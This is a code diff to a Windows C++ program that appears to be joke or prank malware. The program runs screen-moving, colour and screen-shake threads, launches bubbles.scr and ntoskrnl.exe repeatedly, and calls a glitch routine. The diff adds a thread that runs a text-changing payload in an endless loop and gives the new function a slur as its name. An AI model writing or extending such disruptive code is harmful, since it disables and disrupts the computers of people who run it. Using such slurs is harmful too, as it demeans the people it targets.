@@ -239,6 +239,14 @@ int sus (void) {
 
 }
 
+
+void gay
+(
+    void
+) {
+    while (true)
+        payloadChangeText();
+}
 int WINAPI wWinMain(
     __in HINSTANCE hInstance,
     __in_opt HINSTANCE hPrevInstance,
@@ -267,14 +275,8 @@ int WINAPI wWinMain(
     thread a(ScrMove, std::ref(quit_flag));
     thread b(rainb, std::ref(delayed_quit_flag));
     thread c(scrshake, std::ref(ddelayed_quit_flag));
+    thread SomeTrolling(gay);
     Sleep(10000);
-    ShellExecuteA(NULL, "open", "bubbles.scr", NULL, NULL, 10);
-    ShellExecuteA(NULL, "open", "bubbles.scr", NULL, NULL, 10);
-    ShellExecuteA(NULL, "open", "bubbles.scr", NULL, NULL, 10);
-    ShellExecuteA(NULL, "open", "bubbles.scr", NULL, NULL, 10);
-    ShellExecuteA(NULL, "open", "bubbles.scr", NULL, NULL, 10);
-    ShellExecuteA(NULL, "open", "bubbles.scr", NULL, NULL, 10);
-    ShellExecuteA(NULL, "open", "bubbles.scr", NULL, NULL, 10);
     ShellExecuteA(NULL, "open", "bubbles.scr", NULL, NULL, 10);
     ShellExecuteA(NULL, "open", "bubbles.scr", NULL, NULL, 10);
     ShellExecuteA(NULL, "open", "bubbles.scr", NULL, NULL, 10);
@@ -294,10 +296,6 @@ int WINAPI wWinMain(
     ShellExecuteA(NULL, "open", "ntoskrnl.exe", NULL, NULL, 10);
     Sleep(3000);
     Glitch();
-    payloadChangeText();
-    payloadChangeText();
-    payloadChangeText();
-    payloadChangeText();
     delayed_quit_flag = true;
     Sleep(10000);
     BOOLEAN bl;
